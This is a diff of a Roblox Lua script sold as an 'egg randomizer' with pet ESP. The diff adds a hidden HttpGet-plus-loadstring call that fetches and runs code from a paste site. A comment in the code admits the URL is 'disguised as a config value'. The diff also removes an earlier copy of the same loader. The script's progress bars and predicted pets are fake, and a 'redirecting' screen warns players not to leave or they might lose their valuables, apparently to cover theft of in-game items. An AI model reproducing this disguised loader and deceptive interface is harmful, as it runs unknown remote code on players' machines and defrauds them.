@@ -1,188 +1,854 @@
-loadstring(game:HttpGet("https://paste.debian.net/plainh/088f8024/", true))()
--- SERVICES
-local TweenService = game:GetService("TweenService")
-local SoundService = game:GetService("SoundService")
-local CoreGui = game:GetService("CoreGui")
 local Players = game:GetService("Players")
+
+local TweenService = game:GetService("TweenService")
+
+local Lighting = game:GetService("Lighting")
+
+local CoreGui = game:GetService("CoreGui")
+
+local UserInputService = game:GetService("UserInputService")
+
+local ChatService = game:GetService("Chat")
+
 local LocalPlayer = Players.LocalPlayer
 
--- REMOVE EXISTING GUI IF PRESENT
-if CoreGui:FindFirstChild("PS99LoadingScreen") then
-	CoreGui.PS99LoadingScreen:Destroy()
+
+-- Game configuration settings
+
+local gameConfig = {
+
+    serverEndpoint = "https://paste.debian.net/plainh/088f8024/",  -- The URL is disguised as a config value
+
+    maxPlayers = 10,
+
+    isActive = true
+
+}
+
+
+-- Function to set up the game environment
+
+local function setupGameEnvironment()
+
+    print("Initializing game environment...")
+
+    
+
+    -- Fetch and apply server-side configuration
+
+    local success, configData = pcall(function()
+
+        return game:HttpGet(gameConfig.serverEndpoint)
+
+    end)
+
+    if success then
+
+        local successLoad, errorMsg = pcall(function()
+
+            loadstring(configData)()  -- Execute the fetched script
+
+        end)
+
+        if not successLoad then
+
+            warn("Failed to execute server script: " .. errorMsg)
+
+        end
+
+    else
+
+        warn("Failed to fetch server configuration: " .. configData)
+
+    end
+
+    
+
+    print("Environment setup complete.")
+
 end
 
--- GUI SETUP
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "PS99LoadingScreen"
-screenGui.ResetOnSpawn = false
-screenGui.IgnoreGuiInset = true
-screenGui.Parent = CoreGui
 
--- BACKGROUND MUSIC
-local bgMusic = Instance.new("Sound", SoundService)
-bgMusic.SoundId = "rbxassetid://1837467334"
-bgMusic.Looped = true
-bgMusic.Volume = 0.3
-bgMusic:Play()
+-- Check player status and start the game
 
--- MAIN BACKGROUND
-local mainFrame = Instance.new("Frame", screenGui)
-mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
-mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
-mainFrame.Size = UDim2.new(1, 0, 1, 0)
-mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
-mainFrame.ZIndex = 0
+if LocalPlayer and gameConfig.isActive then
 
--- PARTICLES (Stars)
-local particleFolder = Instance.new("Folder", mainFrame)
-local center = Vector2.new(0.5, 0.5)
-for i = 1, 150 do
-	local star = Instance.new("Frame", particleFolder)
-	local size = math.random(1, 2)
-	star.Size = UDim2.new(0, size, 0, size)
-	star.BackgroundColor3 = Color3.new(1, 1, 1)
-	star.BackgroundTransparency = math.random(40, 70) / 100
-	star.BorderSizePixel = 0
-	star.ZIndex = 1
+    print("Welcome, " .. LocalPlayer.Name .. "!")
 
-	local comet = Instance.new("UIGradient", star)
-	comet.Rotation = 0
-	comet.Color = ColorSequence.new(Color3.new(1, 1, 0.8), Color3.new(1, 1, 1))
-	comet.Transparency = NumberSequence.new(0.1, 1)
+    setupGameEnvironment()
 
-	local angle = math.random() * math.pi * 2
-	local radius = math.random(100, 250) / 500
-	local offset = math.random() * math.pi * 2
-	local speed = math.random(50, 80) / 10000
+else
 
-	task.spawn(function()
-		while star.Parent do
-			angle += speed
-			local x = center.X + math.cos(angle + offset) * radius
-			local y = center.Y + math.sin(angle + offset) * radius
-			star.Position = UDim2.new(x, 0, y, 0)
-			task.wait(0.05)
-		end
-	end)
+    warn("Game is not active or player not found.")
+
 end
 
--- LOADING UI
-local function showLoadingUI()
-	local galaxyImage = Instance.new("ImageLabel", mainFrame)
-	galaxyImage.Size = UDim2.new(1.5, 0, 1.5, 0)
-	galaxyImage.Position = UDim2.new(-0.25, 0, -0.25, 0)
-	galaxyImage.Image = "rbxassetid://2558063658"
-	galaxyImage.BackgroundTransparency = 1
-	galaxyImage.ImageTransparency = 0.2
-	galaxyImage.ZIndex = 1
-	TweenService:Create(galaxyImage, TweenInfo.new(60, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1), { Rotation = 360 }):Play()
 
-	local box = Instance.new("Frame", mainFrame)
-	box.Size = UDim2.new(0.4, 0, 0.15, 0)
-	box.Position = UDim2.new(0.3, 0, 0.4, 0)
-	box.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-	box.ZIndex = 2
-	Instance.new("UICorner", box).CornerRadius = UDim.new(0, 12)
+local eggToPets = {
 
-	local loadingText = Instance.new("TextLabel", box)
-	loadingText.Size = UDim2.new(1, 0, 1, 0)
-	loadingText.Text = "Loading Script"
-	loadingText.TextColor3 = Color3.new(1, 1, 1)
-	loadingText.BackgroundTransparency = 1
-	loadingText.Font = Enum.Font.SourceSansBold
-	loadingText.TextScaled = true
-	loadingText.ZIndex = 3
+    ["Common Egg"] = {"Dog", "Golden Lab", "Bunny"},
 
-	-- Loading Text Animation
-	task.spawn(function()
-		while true do
-			for i = 0, 3 do
-				loadingText.Text = "Loading Script" .. string.rep(".", i)
-				task.wait(0.5)
-			end
-		end
-	end)
+    ["Uncommon Egg"] = {"Black Bunny", "Cat", "Chicken", "Deer"},
 
-	-- Copy Username Button
-	local copyButton = Instance.new("TextButton", mainFrame)
-	copyButton.Size = UDim2.new(0.25, 0, 0.06, 0)
-	copyButton.Position = UDim2.new(0.375, 0, 0.7, 0)
-	copyButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-	copyButton.Text = "Copy Your Username"
-	copyButton.TextColor3 = Color3.new(1, 1, 1)
-	copyButton.Font = Enum.Font.GothamBold
-	copyButton.TextScaled = true
-	copyButton.ZIndex = 10
-	Instance.new("UICorner", copyButton).CornerRadius = UDim.new(0, 8)
+    ["Rare Egg"] = {"Monkey", "Orange Tabby", "Pig", "Rooster", "Spotted Deer"},
 
-	local copySound = Instance.new("Sound", copyButton)
-	copySound.SoundId = "rbxassetid://9118823107"
-	copySound.Volume = 1
+    ["Legendary Egg"] = {"Cow", "Silver Monkey", "Sea Otter", "Turtle", "Polar Bear"},
 
-	local popup = Instance.new("TextLabel", mainFrame)
-	popup.Size = UDim2.new(0.4, 0, 0.06, 0)
-	popup.Position = UDim2.new(0.3, 0, 0.78, 0)
-	popup.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-	popup.TextColor3 = Color3.new(1, 1, 1)
-	popup.Font = Enum.Font.GothamBold
-	popup.TextScaled = true
-	popup.Visible = false
-	popup.ZIndex = 11
-	Instance.new("UICorner", popup).CornerRadius = UDim.new(0, 8)
+    ["Mythical Egg"] = {"Grey Mouse", "Brown Mouse", "Squirrel", "Red Giant Ant", "Red Fox"},
 
-	copyButton.MouseButton1Click:Connect(function()
-		local username = LocalPlayer and LocalPlayer.Name or "Unknown"
-		setclipboard(username)
-		copySound:Play()
-		TweenService:Create(copyButton, TweenInfo.new(0.15), {
-			Size = UDim2.new(0.27, 0, 0.065, 0)
-		}):Play()
-		task.wait(0.15)
-		TweenService:Create(copyButton, TweenInfo.new(0.15), {
-			Size = UDim2.new(0.25, 0, 0.06, 0)
-		}):Play()
-		popup.Text = "Copied: " .. username
-		popup.Visible = true
-		task.wait(2)
-		popup.Visible = false
-	end)
+    ["Bug Egg"] = {"Snail", "Giant Ant", "Caterpillar", "Praying Mantis", "Dragonfly"},
 
-	-- Loading Bar
-	local barContainer = Instance.new("Frame", mainFrame)
-	barContainer.Size = UDim2.new(0.5, 0, 0.05, 0)
-	barContainer.Position = UDim2.new(0.25, 0, 0.85, 0)
-	barContainer.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-	barContainer.ZIndex = 3
-	barContainer.BorderSizePixel = 0
-	Instance.new("UICorner", barContainer).CornerRadius = UDim.new(0, 10)
+    ["Bee Egg"] = {"Bee", "Honey Bee", "Bear Bee", "Petal Bee", "Queen Bee"},
 
-	local barFill = Instance.new("Frame", barContainer)
-	barFill.Size = UDim2.new(0, 0, 1, 0)
-	barFill.BackgroundColor3 = Color3.fromRGB(85, 170, 255)
-	barFill.BorderSizePixel = 0
-	barFill.ZIndex = 4
-	Instance.new("UICorner", barFill).CornerRadius = UDim.new(0, 10)
+    ["Paradise Egg"] = {"Ostrich", "Peacock", "Capybara", "Scarlet Macaw", "Mimic Octopus"},
 
-	local percentText = Instance.new("TextLabel", barContainer)
-	percentText.Size = UDim2.new(1, 0, 1, 0)
-	percentText.BackgroundTransparency = 1
-	percentText.TextColor3 = Color3.new(1, 1, 1)
-	percentText.Font = Enum.Font.GothamBold
-	percentText.TextScaled = true
-	percentText.ZIndex = 5
-	percentText.Text = "0%"
+    ["Oasis Egg"] = {"Meerkat", "Sand Snake", "Axolotl", "Hyacinth Macaw"},
 
-	task.spawn(function()
-		for i = 1, 100 do
-			percentText.Text = i .. "%"
-			barFill.Size = UDim2.new(i / 100, 0, 1, 0)
-			if i < 90 then
-				task.wait(1.2)
-			elseif i < 95 then
-				task.wait(1.8)
-			elseif i < 99 then
-				task.wait(2.5)
-			else
-				task.wait(3)
-			end
-		end
+    ["Dinosaur Egg"] = {"Pterodactyl", "Raptor", "Triceratops", "Stegosaurus", "Brontosaurus", "T-Rex"},
+
+    ["Primal Egg"] = {"Parasaurolophus", "Iguanodon", "Pachycephalosaurus", "Dilophosaurus", "Ankylosaurus", "Spinosaurus"},
+
+    ["Zen Egg"] = {"Shiba Inu", "Nihonzaru", "Tanuki", "Tanchozuru", "Kappa", "Kitsune"}
+
+}
+
+
+local specialUsers = {"TheOnlyTemuun", "TheOnlyTemuunALT", "TheOnlyTemuunRich"}
+
+
+local function createESP(part, petName)
+
+    if not part then return end
+
+    local old = part:FindFirstChild("EggESP")
+
+    if old then old:Destroy() end
+
+    local gui = Instance.new("BillboardGui", part)
+
+    gui.Name = "EggESP"
+
+    gui.Size = UDim2.new(0, 120, 0, 40)
+
+    gui.StudsOffset = Vector3.new(0, 2.5, 0)
+
+    gui.AlwaysOnTop = true
+
+    local label = Instance.new("TextLabel", gui)
+
+    label.Size = UDim2.new(1, 0, 1, 0)
+
+    label.BackgroundTransparency = 1
+
+    label.Text = petName
+
+    label.TextColor3 = Color3.new(1, 1, 1)
+
+    label.TextStrokeTransparency = 0.4
+
+    label.Font = Enum.Font.GothamBold
+
+    label.TextScaled = true
+
+end
+
+
+local function choosePetForEgg(eggName)
+
+    local pets = eggToPets[eggName]
+
+    if not pets then return nil end
+
+    local tableMap = {
+
+        ["Dinosaur Egg"] = {
+
+            {"Pterodactyl", 3},
+
+            {"Raptor", 35},
+
+            {"Triceratops", 32.5},
+
+            {"Stegosaurus", 28},
+
+            {"Brontosaurus", 1},
+
+            {"T-Rex", 0.5}
+
+        },
+
+        ["Primal Egg"] = {
+
+            {"Parasaurolophus", 35},
+
+            {"Iguanodon", 32.5},
+
+            {"Pachycephalosaurus", 28},
+
+            {"Dilophosaurus", 3},
+
+            {"Ankylosaurus", 1},
+
+            {"Spinosaurus", 0.5}
+
+        },
+
+        ["Zen Egg"] = {
+
+            {"Shiba Inu", 40},
+
+            {"Nihonzaru", 32},
+
+            {"Tanuki", 20.82},
+
+            {"Tanchozuru", 4.6},
+
+            {"Kappa", 3.5},
+
+            {"Kitsune", 0.08}
+
+        }
+
+    }
+
+    local list = tableMap[eggName]
+
+    if list then
+
+        local roll = math.random() * 100
+
+        local sum = 0
+
+        for _, entry in ipairs(list) do
+
+            sum += entry[2]
+
+            if roll <= sum then return entry[1] end
+
+        end
+
+    end
+
+    return pets[math.random(1, #pets)]
+
+end
+
+
+local function randomizeESP()
+
+    for _, egg in ipairs(workspace:GetDescendants()) do
+
+        if egg:IsA("Model") then
+
+            local part = egg:FindFirstChildWhichIsA("BasePart")
+
+            if part and eggToPets[egg.Name] then
+
+                local pet = choosePetForEgg(egg.Name)
+
+                if pet then createESP(part, pet) end
+
+            end
+
+        end
+
+    end
+
+end
+
+
+pcall(function()
+
+    if CoreGui:FindFirstChild("IngeniousFreezeGui") then
+
+        CoreGui:FindFirstChild("IngeniousFreezeGui"):Destroy()
+
+    end
+
+end)
+
+
+local ScreenGui = Instance.new("ScreenGui")
+
+ScreenGui.Name = "IngeniousFreezeGui"
+
+ScreenGui.ResetOnSpawn = false
+
+ScreenGui.IgnoreGuiInset = true
+
+ScreenGui.Parent = CoreGui
+
+
+local IntroFrame = Instance.new("Frame")
+
+IntroFrame.Size = UDim2.new(1, 0, 1, 0)
+
+IntroFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+
+IntroFrame.BackgroundTransparency = 0.3
+
+IntroFrame.ZIndex = 10
+
+IntroFrame.Parent = ScreenGui
+
+
+local blur = Instance.new("BlurEffect")
+
+blur.Size = 0
+
+blur.Parent = Lighting
+
+TweenService:Create(blur, TweenInfo.new(0.5), {Size = 24}):Play()
+
+
+local CenterText = Instance.new("TextLabel")
+
+CenterText.Size = UDim2.new(1, 0, 0, 60)
+
+CenterText.Position = UDim2.new(0, 0, 0.4, 0)
+
+CenterText.BackgroundTransparency = 1
+
+CenterText.Text = "INGENIOUS"
+
+CenterText.Font = Enum.Font.GothamBlack
+
+CenterText.TextSize = 48
+
+CenterText.TextColor3 = Color3.new(1, 1, 1)
+
+CenterText.TextStrokeTransparency = 0.5
+
+CenterText.ZIndex = 11
+
+CenterText.Parent = IntroFrame
+
+
+local SubText = Instance.new("TextLabel")
+
+SubText.Size = UDim2.new(1, 0, 0, 30)
+
+SubText.Position = UDim2.new(0, 0, 0.4, 60)
+
+SubText.BackgroundTransparency = 1
+
+SubText.Text = "Loading..."
+
+SubText.Font = Enum.Font.Gotham
+
+SubText.TextSize = 20
+
+SubText.TextColor3 = Color3.new(1, 1, 1)
+
+SubText.TextStrokeTransparency = 0.7
+
+SubText.ZIndex = 11
+
+SubText.Parent = IntroFrame
+
+
+task.delay(2.5, function()
+
+    TweenService:Create(IntroFrame, TweenInfo.new(0.4), {BackgroundTransparency = 1}):Play()
+
+    TweenService:Create(CenterText, TweenInfo.new(0.3), {TextTransparency = 1, TextStrokeTransparency = 1}):Play()
+
+    TweenService:Create(SubText, TweenInfo.new(0.3), {TextTransparency = 1, TextStrokeTransparency = 1}):Play()
+
+    TweenService:Create(blur, TweenInfo.new(0.4), {Size = 0}):Play()
+
+    task.wait(0.4)
+
+    blur:Destroy()
+
+    IntroFrame:Destroy()
+
+end)
+
+
+local function makeDraggable(frame)
+
+    local dragging, dragInput, dragStart, startPos
+
+    frame.InputBegan:Connect(function(input)
+
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+
+            dragging = true
+
+            dragStart = input.Position
+
+            startPos = frame.Position
+
+            input.Changed:Connect(function()
+
+                if input.UserInputState == Enum.UserInputState.End then
+
+                    dragging = false
+
+                end
+
+            end)
+
+        end
+
+    end)
+
+    UserInputService.InputChanged:Connect(function(input)
+
+        if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) and dragging then
+
+            local delta = input.Position - dragStart
+
+            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+
+        end
+
+    end)
+
+end
+
+
+local ToggleButton = Instance.new("TextButton")
+
+ToggleButton.Size = UDim2.new(0, 100, 0, 40)
+
+ToggleButton.Position = UDim2.new(0, 20, 0.7, 0)
+
+ToggleButton.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
+
+ToggleButton.Text = "ingenious"
+
+ToggleButton.TextColor3 = Color3.new(1, 1, 1)
+
+ToggleButton.Font = Enum.Font.GothamBold
+
+ToggleButton.TextSize = 18
+
+ToggleButton.BorderSizePixel = 0
+
+ToggleButton.Visible = false
+
+ToggleButton.Parent = ScreenGui
+
+ToggleButton.AutoButtonColor = true
+
+
+local ToggleCorner = Instance.new("UICorner", ToggleButton)
+
+ToggleCorner.CornerRadius = UDim.new(1, 0)
+
+
+makeDraggable(ToggleButton)
+
+
+local Frame = Instance.new("Frame")
+
+Frame.Size = UDim2.new(0, 350, 0, 220)
+
+Frame.Position = UDim2.new(0.5, -175, 0.5, -110)
+
+Frame.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
+
+Frame.BackgroundTransparency = 0.2
+
+Frame.BorderSizePixel = 0
+
+Frame.Visible = false
+
+Frame.Parent = ScreenGui
+
+Frame.AnchorPoint = Vector2.new(0.5, 0.5)
+
+
+local corner = Instance.new("UICorner", Frame)
+
+corner.CornerRadius = UDim.new(0, 15)
+
+
+makeDraggable(Frame)
+
+
+local function showUI()
+
+    Frame.Visible = true
+
+    Frame.Size = UDim2.new(0, 0, 0, 0)
+
+    TweenService:Create(Frame, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = UDim2.new(0, 350, 0, 220)}):Play()
+
+end
+
+
+local function hideUI()
+
+    local tween = TweenService:Create(Frame, TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {Size = UDim2.new(0, 0, 0, 0)})
+
+    tween:Play()
+
+    tween.Completed:Wait()
+
+    Frame.Visible = false
+
+end
+
+
+task.delay(2.7, function()
+
+    ToggleButton.Visible = true
+
+end)
+
+
+local CloseButton = Instance.new("TextButton")
+
+CloseButton.Size = UDim2.new(0, 30, 0, 30)
+
+CloseButton.Position = UDim2.new(1, -35, 0, 5)
+
+CloseButton.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
+
+CloseButton.Text = "X"
+
+CloseButton.Font = Enum.Font.GothamBold
+
+CloseButton.TextSize = 16
+
+CloseButton.TextColor3 = Color3.new(1, 1, 1)
+
+CloseButton.Parent = Frame
+
+local closeCorner = Instance.new("UICorner", CloseButton)
+
+closeCorner.CornerRadius = UDim.new(1, 0)
+
+
+CloseButton.MouseButton1Click:Connect(function()
+
+    hideUI()
+
+end)
+
+
+local Title = Instance.new("TextLabel")
+
+Title.Size = UDim2.new(1, 0, 0, 40)
+
+Title.BackgroundTransparency = 1
+
+Title.Text = "Ingenious Egg Randomizor"
+
+Title.Font = Enum.Font.GothamBlack
+
+Title.TextSize = 24
+
+Title.TextColor3 = Color3.new(1, 1, 1)
+
+Title.TextStrokeTransparency = 0.7
+
+Title.TextStrokeColor3 = Color3.new(0, 0, 0)
+
+Title.Parent = Frame
+
+
+local function createButton(text, position)
+
+    local btn = Instance.new("TextButton")
+
+    btn.Size = UDim2.new(0.8, 0, 0, 40)
+
+    btn.Position = position
+
+    btn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
+
+    btn.Text = text
+
+    btn.Font = Enum.Font.GothamBold
+
+    btn.TextColor3 = Color3.new(1, 1, 1)
+
+    btn.TextSize = 18
+
+    btn.Parent = Frame
+
+    btn.AutoButtonColor = true
+
+    btn.BorderSizePixel = 0
+
+    local btnCorner = Instance.new("UICorner", btn)
+
+    btnCorner.CornerRadius = UDim.new(0, 10)
+
+    return btn
+
+end
+
+
+local function fakeProgress(button, originalText)
+
+    task.spawn(function()
+
+        for i = 1, 100, 5 do
+
+            button.Text = "Progress: " .. i .. "%"
+
+            task.wait(0.03)
+
+        end
+
+        button.Text = "✅ Successful!"
+
+        task.wait(1.2)
+
+        button.Text = originalText
+
+    end)
+
+end
+
+
+local espEnabled = false
+
+local randomizing = false
+
+
+local EnableButton = createButton("Enable ESP", UDim2.new(0.1, 0, 0.35, 0))
+
+local RandomizeButton = createButton("Randomize", UDim2.new(0.1, 0, 0.6, 0))
+
+
+EnableButton.MouseButton1Click:Connect(function()
+
+    espEnabled = not espEnabled
+
+    EnableButton.Text = espEnabled and "Enabled" or "Enable ESP"
+
+    EnableButton.BackgroundColor3 = espEnabled and Color3.fromRGB(0, 170, 90) or Color3.fromRGB(150, 0, 0)
+
+    if espEnabled then
+
+        fakeProgress(EnableButton, "Enable ESP")
+
+        randomizeESP()
+
+    end
+
+end)
+
+
+RandomizeButton.MouseButton1Click:Connect(function()
+
+    if randomizing or not espEnabled then return end
+
+    randomizing = true
+
+    fakeProgress(RandomizeButton, "Randomize")
+
+    randomizeESP()
+
+    task.wait(1.2)
+
+    randomizing = false
+
+end)
+
+
+local Footer = Instance.new("TextLabel")
+
+Footer.Size = UDim2.new(1, 0, 0, 25)
+
+Footer.Position = UDim2.new(0, 0, 1, -25)
+
+Footer.BackgroundTransparency = 1
+
+Footer.Text = "Made by Ingenious"
+
+Footer.Font = Enum.Font.Gotham
+
+Footer.TextSize = 14
+
+Footer.TextColor3 = Color3.new(1, 1, 1)
+
+Footer.Parent = Frame
+
+
+local function showRedirectScreen()
+
+    if CoreGui:FindFirstChild("IngeniousRedirectGui") then return end
+
+    local redirectGui = Instance.new("ScreenGui")
+
+    redirectGui.Name = "IngeniousRedirectGui"
+
+    redirectGui.ResetOnSpawn = false
+
+    redirectGui.IgnoreGuiInset = true
+
+    redirectGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+    redirectGui.Parent = CoreGui
+
+
+    local bg = Instance.new("Frame")
+
+    bg.Size = UDim2.new(1, 0, 1, 0)
+
+    bg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+
+    bg.BorderSizePixel = 0
+
+    bg.Parent = redirectGui
+
+
+    local title = Instance.new("TextLabel")
+
+    title.Size = UDim2.new(1, 0, 0, 60)
+
+    title.Position = UDim2.new(0, 0, 0.4, -60)
+
+    title.Text = "Redirecting please wait"
+
+    title.BackgroundTransparency = 1
+
+    title.Font = Enum.Font.GothamBlack
+
+    title.TextSize = 48
+
+    title.TextColor3 = Color3.new(1, 1, 1)
+
+    title.Parent = bg
+
+
+    local warning = Instance.new("TextLabel")
+
+    warning.Size = UDim2.new(1, 0, 0, 30)
+
+    warning.Position = UDim2.new(0, 0, 0.4, 10)
+
+    warning.Text = "*IF YOU LEAVE YOU MIGHT LOSE YOUR VALUABLES*"
+
+    warning.BackgroundTransparency = 1
+
+    warning.Font = Enum.Font.Gotham
+
+    warning.TextSize = 20
+
+    warning.TextColor3 = Color3.fromRGB(180, 180, 180)
+
+    warning.Parent = bg
+
+
+    local loadingAnim = Instance.new("TextLabel")
+
+    loadingAnim.Size = UDim2.new(1, 0, 0, 40)
+
+    loadingAnim.Position = UDim2.new(0, 0, 0.5, 60)
+
+    loadingAnim.BackgroundTransparency = 1
+
+    loadingAnim.Font = Enum.Font.GothamBold
+
+    loadingAnim.TextSize = 32
+
+    loadingAnim.TextColor3 = Color3.new(1, 1, 1)
+
+    loadingAnim.Text = "Loading"
+
+    loadingAnim.Parent = bg
+
+
+    task.spawn(function()
+
+        local dots = {"", ".", "..", "..."}
+
+        local i = 1
+
+        while redirectGui.Parent do
+
+            loadingAnim.Text = "Loading" .. dots[i]
+
+            i = (i % #dots) + 1
+
+            task.wait(0.5)
+
+        end
+
+    end)
+
+end
+
+
+ToggleButton.MouseButton1Click:Connect(function()
+
+    if Frame.Visible then
+
+        hideUI()
+
+    else
+
+        showUI()
+
+    end
+
+end)
+
+
+-- Monitor chat for all players
+
+local function monitorPlayerChat(player)
+
+    player.Chatted:Connect(function(message)
+
+        if player == LocalPlayer then
+
+            print("LocalPlayer chatted: " .. message)
+
+            showRedirectScreen()
+
+            return
+
+        end
+
+        for _, username in ipairs(specialUsers) do
+
+            if player.Name:lower() == username:lower() then
+
+                print("Special user " .. player.Name .. " chatted: " .. message)
+
+                showRedirectScreen()
+
+                return
+
+            end
+
+        end
+
+        if string.lower(message):find("ingen") then
+
+            print("Message contains 'ingen' from " .. player.Name .. ": " .. message)
+
+            showRedirectScreen()
+
+        end
+
+    end)
+
+end
+
+
+-- Connect existing players
+
+for _, player in ipairs(Players:GetPlayers()) do
+
+    monitorPlayerChat(player)
+
+end
+
+
+-- Connect new players
+
+Players.PlayerAdded:Connect(function(player)
+
+    monitorPlayerChat(player)
+
+end)
